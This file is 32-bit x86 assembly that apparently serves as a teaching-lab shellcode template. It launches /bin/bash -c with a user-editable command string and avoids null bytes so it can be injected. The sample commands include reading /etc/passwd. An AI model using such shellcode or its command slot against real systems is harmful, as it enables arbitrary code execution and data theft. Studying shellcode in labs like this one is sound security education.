STR1 equ 16       ; offset of "/bin/bash"
STR2 equ STR1+10  ; offset of "-c"
STR3 equ STR2+3   ; offset of the command string

section .text
  global _start
    _start:
	BITS 32
	jmp short two
    one:
 	pop ecx             ; Get the address of the data

        ; Add zero to each of string
 	xor eax, eax
 	mov [ecx+STR1+9], al      ; terminate the /bin/bash string
 	mov [ecx+STR2+2], al      ; terminate the -c string

 	;mov [ecx+STR3+180-1], al ; this will introduce zeros in instruction. 
	; use the following instead
	xor edx, edx
	mov dl, STR3+180-1        ; edx = STR3 + 179
	mov [ecx+edx], al,        ; terminate the command string

        ; Construct the argument arrays
        lea ebx, [ecx+STR1]  ; ebx = ecx + STR1: address of "/bin/bash"
 	mov [ecx+0],  ebx    ; argv[0]  = "/bin/bash"

        lea eax, [ecx+STR2]  ; eax = ecx + STR2  
 	mov [ecx+4],  eax    ; argv[1]  = "-c"

        lea eax, [ecx+STR3]  ; eax = ecx + STR3 
 	mov [ecx+8],  eax    ; argv[2]  = the command string

 	xor eax, eax
 	mov [ecx+12], eax    ; argv[3]  = 0

        xor edx, edx         ; edx = 0
        mov al,  0x0b   
        int 0x80
     two:
        call one                                                                   
        db 'AAAA'   ; Place holder for argv[0] --> "/bin/bash"
        db 'BBBB'   ; Place holder for argv[1] --> "-c"
        db 'CCCC'   ; Place holder for argv[2] --> the command string
        db 'DDDD'   ; Place holder for argv[3] --> NULL
        db '/bin/bash*'
        db '-c*'
	;; You can put your commands in the following three lines. 
	;; Separating the commands using semicolons.
	;; Make sure you don't change the length of each line. 
	;; The * in the 3rd line will be replaced by a binary zero.
        db '/bin/ls -l; echo Hello 32; /bin/tail -n 2 /etc/passwd;      '
        db '    echo;         echo "1234"; echo 5678;                   '
        db '    ping -c 2 127.0.0.1 &   echo 9999                      *'
        ;;;'123456789012345678901234567890123456789012345678901234567890'



